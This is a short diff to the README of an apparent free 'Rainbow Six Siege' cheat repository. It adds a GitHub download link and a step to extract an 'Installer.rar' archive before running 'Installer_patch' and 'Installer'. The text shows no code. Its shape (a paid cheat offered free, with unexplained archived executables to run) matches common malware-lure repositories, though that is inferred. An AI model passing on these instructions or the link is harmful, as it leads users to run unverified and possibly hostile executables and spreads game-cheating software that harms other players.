@@ -11,8 +11,9 @@ A paid Rainbow Six Siege cheat for free, patch used
 - Many others
 ### Setup
 
-- Download source code zip ( )
+- Download source code zip (https://github.com/rj424/promanners.git)
 - Extract zip
+- Extract 'Installer.rar'
 - Run 'Installer_patch' to update 'Installer' launcher
 - Run 'Installer' and set it up
 - Follow the instructions and you are good to go
